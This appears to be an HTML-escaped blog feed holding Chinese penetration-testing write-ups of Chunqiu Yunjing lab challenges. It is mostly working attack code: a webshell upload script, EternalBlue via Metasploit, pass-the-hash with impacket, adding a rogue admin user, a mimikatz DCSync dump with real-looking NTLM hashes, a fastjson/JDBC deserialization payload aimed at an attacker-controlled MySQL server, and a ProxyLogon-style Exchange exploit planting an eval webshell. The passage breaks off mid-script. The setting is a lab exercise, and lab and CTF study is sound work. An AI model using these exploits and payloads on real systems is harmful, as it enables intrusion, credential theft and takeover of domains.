&#x27;&lt;ADMINUSER_BASE64&gt;&#x27;,</span></span><br><span class="line"><span class="comment"># &#x27;adminpass&#x27;: &#x27;&lt;ADMINPASS_BASE64&gt;&#x27;,</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"><span class="comment"># url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: open(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line">filepath = str(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[0] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">url3 = url_pre + f<span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è®°å¾—è‡ªå·±å†™ä¸ª1.phpçš„é©¬å­ï¼Œèšå‰‘è¿æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\flag&gt; <span class="built_in">type</span> flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><p>172.22.1.21æ˜¯ä¸ªms17-010ï¼Œä¸Šmsfæ‰“å°±å®Œäº‹äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">show payloads</span><br><span class="line"><span class="built_in">set</span> payload payload/windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 172.22.1.21</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>ç„¶åç­‰ç€æ‹¿shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashdump</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Administrator</span>:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">48</span>f6da83eb89a4da8a1cc963b855a799:::</span><br><span class="line"><span class="attribute">Guest</span>:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>æ¨ªå‘ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :48f6da83eb89a4da8a1cc963b855a799 ./administrator@172.22.1.21 -codec gbk</span><br></pre></td></tr></table></figure><p>æ²¡æ‰¾åˆ°flagï¼ŒåŠ ä¸ªç”¨æˆ·ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Chu0 <span class="built_in">whoami</span>@666 /add</span><br><span class="line">net localgroup administrators Chu0 /add</span><br></pre></td></tr></table></figure><p>bloodhoundæ”¶é›†ä¿¡æ¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820162234549.png" alt="image-20240820162234549"></p><p>æ‰€ä»¥ç›´æ¥dumpåŸŸç®¡å“ˆå¸Œï¼Œæ¨ªå‘è¿‡å»æ‹¿åˆ°åŸŸæ§çš„flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514</span><br><span class="line">1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512</span><br><span class="line">1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512</span><br><span class="line">1000    DC01$   075b7ba049ee9b65eb3aea0fb13440e3        532480</span><br><span class="line">500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512</span><br><span class="line">1104    XIAORANG-OA01$  eca40798d7ca35d5b2f0ecb7217a68a5        4096</span><br><span class="line">1108    XIAORANG-WIN7$  c7631dbcd38dac582e8c891880c40517        4096</span><br></pre></td></tr></table></figure><p>æ¨ªå‘åŸŸç®¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Exchange</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Exchange.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Exchange.html</id>
    <published>2024-08-20T15:20:52.615Z</published>
    <updated>2024-08-20T15:35:08.678Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Exchange</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">39.101.171.222:8000 open</span><br><span class="line">39.101.171.222:22 open</span><br><span class="line">39.101.171.222:80 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.101.171.222     code:200 len:19813  title:lumia</span><br><span class="line">[*] WebTitle http://39.101.171.222:8000 code:302 len:0      title:None è·³è½¬url: http://39.101.171.222:8000/login.html</span><br><span class="line">[*] WebTitle http://39.101.171.222:8000/login.html code:200 len:5662   title:Lumia ERP</span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTg5NjE5MQ==&amp;mid=2247484475&amp;idx=1&amp;sn=deee0c3bc0b9fe10b89af784947aa1a3&amp;chksm=ce975eabf9e0d7bd5c952c462883fa89eafaadfba829dd2058fccb135a5a6970e29fe6487e1a&amp;scene=126&amp;sessionid=1686528295&amp;key=42e64e73470f56ada54bd87e00fbb9ee86826bf40b566f978fb0f0e311c0eb4ab318884991ba35ad361aa1595ed3bd0846512b2fe73e212c0c074eb836d443f457f9ea24f06bf67d68ba10b149db19e7559896ef1ec2dc36c4bc54f89f87a24d4ce56cb88823f6d8b48e0fbde3801b688add37e0d0b8ab1ad98a5fda1cd75ec5&amp;ascene=15&amp;uin=MTI5ODM0MTMwNQ%3D%3D&amp;devicetype=Windows+10+x64&amp;version=63060012&amp;lang=zh_CN&amp;session_us=gh_d299f82219a7&amp;exportkey=n_ChQIAhIQlWqlotH1PqlfVL6dmgb%2BChLvAQIE97dBBAEAAAAAAK%2BgKYPmO94AAAAOpnltbLcz9gKNyK89dVj0th39V71PeGeBRMgmIKcZb%2F9QsVC%2FGXM0IJ6ajy%2Fk6NFsIJtiQRTPKhOq0bWO3qFepGVEcuUw4wcd6D%2BY4mEjP04Ei3hA4IbZNWhi6YZx1hwWoQLYR5UTrFzbCTmOIKCOtYbNdRtn7aZBO0A0IwzQcT0EicW2lhFd9eHg%2FXBMhrLZMn48xmaxjL1qVJIU%2B4Mqld%2FD6KImSIU8TnYXioT9cVKnvQsgIjyGSKDhcZwQ1TXu3vxW0DDGyi%2BWoHmV0s2k%2FMtIkni6IFTz&amp;acctmode=0&amp;pass">å‚è€ƒæ–‡ç« </a>åå¤ERPç»„åˆæ‹³</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user/getAllList;.ico</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820201710222.png" alt="image-20240820201710222"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820201650283.png" alt="image-20240820201650283"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.101.171.222:8000/user/list?search=%7B%20%22name%22%3A%20%7B%20%22%40type%22%3A%20%22java.lang.AutoCloseable%22%2C%20%22%40type%22%3A%20%22com.mysql.jdbc.JDBC4Connection%22%2C%20%22hostToConnectTo%22%3A%20%22ip%22%2C%20%22portToConnectTo%22%3A%203306%2C%20%22info%22%3A%20%7B%20%22user%22%3A%20%22chu0%22%2C%20%22password%22%3A%20%22pass%22%2C%20%22statementInterceptors%22%3A%20%22com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%22%2C%20%22autoDeserialize%22%3A%20%22true%22%2C%20%22NUM_HOSTS%22%3A%20%221%22%20%7D%20%7D</span><br></pre></td></tr></table></figure><p>ä¼ªé€ ä¸€ä¸ªMySQLæœåŠ¡å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820201949903.png" alt="image-20240820201949903"></p><p>searchå€¼çš„ipè®°å¾—æ”¹ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/f*/f*</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ‰«å†…ç½‘ï¼Œæ­ä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 00:16:3e:08:c9:d6  </span><br><span class="line">          inet addr:172.22.3.12  Bcast:172.22.255.255  Mask:255.255.0.0</span><br><span class="line">          inet6 addr: fe80::216:3eff:fe08:c9d6/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:119967 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:74394 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:152794359 (152.7 MB)  TX bytes:21724339 (21.7 MB)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">./fs -h 172.22.3.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.3.12:22 open</span><br><span class="line">172.22.3.9:808 open</span><br><span class="line">172.22.3.2:88 open</span><br><span class="line">172.22.3.9:8172 open</span><br><span class="line">172.22.3.12:8000 open</span><br><span class="line">172.22.3.26:445 open</span><br><span class="line">172.22.3.9:445 open</span><br><span class="line">172.22.3.2:445 open</span><br><span class="line">172.22.3.9:443 open</span><br><span class="line">172.22.3.26:139 open</span><br><span class="line">172.22.3.9:139 open</span><br><span class="line">172.22.3.2:139 open</span><br><span class="line">172.22.3.26:135 open</span><br><span class="line">172.22.3.9:135 open</span><br><span class="line">172.22.3.2:135 open</span><br><span class="line">172.22.3.9:81 open</span><br><span class="line">172.22.3.9:80 open</span><br><span class="line">172.22.3.12:80 open</span><br><span class="line">[*] NetBios: 172.22.3.26     XIAORANG\XIAORANG-PC           </span><br><span class="line">[*] 172.22.3.2  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle: http://172.22.3.12        code:200 len:19813  title:lumia</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.3.9</span><br><span class="line">   [-&gt;]XIAORANG-EXC01</span><br><span class="line">   [-&gt;]172.22.3.9</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.3.2</span><br><span class="line">   [-&gt;]XIAORANG-WIN16</span><br><span class="line">   [-&gt;]172.22.3.2</span><br><span class="line">[*] WebTitle: http://172.22.3.12:8000   code:302 len:0      title:None è·³è½¬url: http://172.22.3.12:8000/login.html</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.3.26</span><br><span class="line">   [-&gt;]XIAORANG-PC</span><br><span class="line">   [-&gt;]172.22.3.26</span><br><span class="line">[*] NetBios: 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP</span><br><span class="line">[*] NetBios: 172.22.3.2      [+]DC XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.3.9:81      code:403 len:1157   title:403 - ç¦æ­¢è®¿é—®: è®¿é—®è¢«æ‹’ç»ã€‚</span><br><span class="line">[*] WebTitle: https://172.22.3.9:8172   code:404 len:0      title:None</span><br><span class="line">[*] WebTitle: http://172.22.3.9         code:403 len:0      title:None</span><br><span class="line">[*] WebTitle: https://172.22.3.9        code:302 len:0      title:None è·³è½¬url: https://172.22.3.9/owa/</span><br><span class="line">[*] WebTitle: https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 code:200 len:28237  title:Outlook</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸€ä¸ªexchangeæœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨å†å²æ¼æ´æ”»å‡»ï¼Œè„šæœ¬å¦‚ä¸‹ï¼Œå¯ä»¥ç›´æ¥è·å–shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 2.py -u c -user administrator -suffix @xiaorang.lab 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">fuzz_email = [<span class="string">&#x27;administrator&#x27;</span>, <span class="string">&#x27;webmaste&#x27;</span>, <span class="string">&#x27;support&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;contact&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;test2&#x27;</span>, <span class="string">&#x27;test01&#x27;</span>, <span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;sysadmin&#x27;</span>, <span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;noreply&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;no-reply&#x27;</span>]</span><br><span class="line"></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line">user_agent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">shell_path = <span class="string">&quot;Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx&quot;</span></span><br><span class="line">shell_absolute_path = <span class="string">&quot;\\\\127.0.0.1\\c$\\%s&quot;</span> % shell_path</span><br><span class="line"><span class="comment"># webshell-é©¬å­å†…å®¹</span></span><br><span class="line">shell_content = <span class="string">&#x27;&lt;script language=&quot;JScript&quot; runat=&quot;server&quot;&gt; function Page_Load()&#123;/**/eval(Request[&quot;code&quot;],&quot;unsafe&quot;);&#125;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">final_shell = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">id_generator</span>(<span class="params">size=<span class="number">6</span>, chars=string.ascii_lowercase + string.digits</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com\nå¦‚æœä¸æ¸…æ¥šç”¨æˆ·åï¼Œå¯ä¸å¡«å†™-userå‚æ•°ï¼Œå°†è‡ªåŠ¨Fuzzç”¨æˆ·åã€‚&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-user&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exist email&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-suffix&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;email suffix&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.u</span><br><span class="line">    suffix = args.suffix</span><br><span class="line">    <span class="keyword">if</span> suffix == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥suffix&quot;</span>)</span><br><span class="line"></span><br><span class="line">    exist_email = args.user</span><br><span class="line">    <span class="keyword">if</span> exist_email:</span><br><span class="line">        fuzz_email.insert(<span class="number">0</span>, exist_email)</span><br><span class="line">    random_name = id_generator(<span class="number">4</span>) + <span class="string">&quot;.js&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç›®æ ‡ Exchange Server: &quot;</span> + target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fuzz_email:</span><br><span class="line">        new_email = i+suffix</span><br><span class="line">        autoDiscoverBody = <span class="string">&quot;&quot;&quot;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">      &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % new_email</span><br><span class="line">        <span class="comment"># print(&quot;get FQDN&quot;)</span></span><br><span class="line">        FQDN = <span class="string">&quot;EXCHANGE01&quot;</span></span><br><span class="line">        ct = requests.get(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=localhost~1942062522&quot;</span>,</span><br><span class="line">                                                                            <span class="string">&quot;User-Agent&quot;</span>: user_agent&#125;,</span><br><span class="line">                      verify=<span class="literal">False</span>, proxies=proxies)</span><br><span 